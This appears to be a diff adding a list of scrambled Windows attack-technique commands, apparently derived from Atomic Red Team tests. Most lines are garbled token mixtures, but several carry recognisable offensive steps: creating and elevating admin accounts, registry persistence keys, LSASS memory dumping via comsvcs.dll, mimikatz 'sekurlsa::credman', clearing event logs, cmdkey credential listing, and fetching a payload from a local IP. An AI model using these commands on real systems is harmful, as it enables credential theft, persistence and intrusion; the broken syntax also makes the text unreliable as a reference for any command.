@@ -1,0 +1,64 @@
+net localgroup administrators administrators
+bitsadmin.exe /create $ { input_folder_name
+`` [ -list | foreach-object ( new-object net.webclient ) \\ $ ( = new-object -r /user fullname -- -startaddress $ shell.createshortcut ( `` hklm\software\microsoft\windows nt\currentversion\windows '' `` defaultaccount
+bitsadmin.exe /setnotifycmdline $ { user_name } > '' $ { registry_path
+net user administrator @ `` $ { filename_regex }
+get-childitem -filter `` start-process `` '' `` user_name c : c `` user_name '' `` `` $ { user_name } /add
+set-executionpolicy -executionpolicy disable-gpu-sandbox ] : = /r : remove-eventlog -r /user : = keylog
+get-wmiobject win32_group
+net user $ ( `` domain admins '' c `` hklm\software\microsoft\windows username '' `` .\ : \windows\system32\comsvcs.dll , minidump shell.createshortcut ( `` set-wmiinstance , minidump _.lastwritetime = ( `` keylog
+net user `` $ : username '' ;
+python -c `` import set-wmiinstance -namespace http : clear-eventlog \windows\system32\desk.cpl ' = ] get-psreadlineoption ) .starttype net.securityprotocoltype ] : net.securityprotocoltype ] : :createprocessfromparent [ ] : :securityprotocol = ) \\ $ ( ) \\ $ _.lastwritetime = `` /category : :securityprotocol = set-wmiinstance , /r :
+add-content : $ /r : .\ : \users\
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled `` threadingmodel '' -value `` red packages
+rundll32 popcalc.dll , keylog
+net group `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` dllname '' /f
+quser
+hklm\software\microsoft\windows -path `` 7 , http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+attrib /hidewmp
+echo `` $ `` hklm\system\currentcontrolset\control\session manager\environment '' /v `` cor_profiler '' '' /f
+silentrunner.exe $ { user_name }
+quser
+rundll32 popcalc.dll , servicepackminorversion
+for : \windows\system32\comsvcs.dll -- select-object -expandproperty -expandproperty
+subfinder -d $ service fltmc.exe administrators
+reg query query
+net user administrator /domain
+rundll32 -name : cor_profiler administrators
+cscript $ { output_zip_name } in $ { copy volumn name you create = set-wmiinstance file set-wmiinstance name '' administrators administrators
+namp -sn $ { user_name } /sc onlogon /ru `` domain
+reg `` hklm\system\currentcontrolset\services\winsock2\parameters `` `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls execution file % windir % appdata % lsass % \system32\osk.exe /grant administrators ( $ filter = set-wmiinstance file set-wmiinstance /grant minidump ( new-object components\atomic_test ; -scope ' administrators
+net user user = `` `` $ { filename_regex }
+net user = `` $ { shadow temp % \system32\osk.exe
+rdrleakdiag.exe /p volumn name you create = set-wmiinstance -namespace set-wmiinstance -namespace atomic_red_team currentprofile name player
+wt.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' $ { string } ;
+net user /add $ { bits_job_name } /add
+wt.exe and -r
+rubeus.exe `` directory_path
+net user user /add
+net user administrator `` `` hklm\system\currentcontrolset\control\print\environments\windows x64\print processors\atomicredteam '' /v `` cor_profiler_path '' $ true
+net user $ ( $ { username admins ) /add
+rundll32 popcalc.dll , keylog
+rundll32 popcalc.dll , keylog
+net shortcut = `` $ { ip_address } -w keylog
+quser
+sekurlsa : :credman
+reg add `` hklm\system\currentcontrolset\control\lsa\ c : reg_dword /v shell file -class processors\atomicredteam '' ' `` keylog
+quser
+net localgroup administrators
+sekurlsa : windir % /for=c :
+net accounts
+net localgroup administrators administrators
+net localgroup administrators `` @ select *
+reg add `` env : `` defaultaccount c : `` hklm\software\microsoft\windows manager\appcertdlls `` driver '' `` $ filter ;
+add-content `` hklm\software\microsoft\windows powershell `` hklm\software\microsoft\windows nt\currentversion\image account `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam '' '' /v `` keylog
+reg `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /v `` cor_profiler -name ( '' ;
+wlrmdr.exe -s $ volumn you create }
+wscript $ { filename_regex }
+`` -filepath $ : volumn name you create = `` set-wmiinstance , -user $ { shadow components\atomic_test )
+cmdkey /list
+net create.save administrators }
+net user = `` '' t1547.009 ; eventnamespace='root\cimv2 , components\atomic_test '' set-wmiinstance name administrators
+net user $ ( $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+cmdkey /list
+net accounts
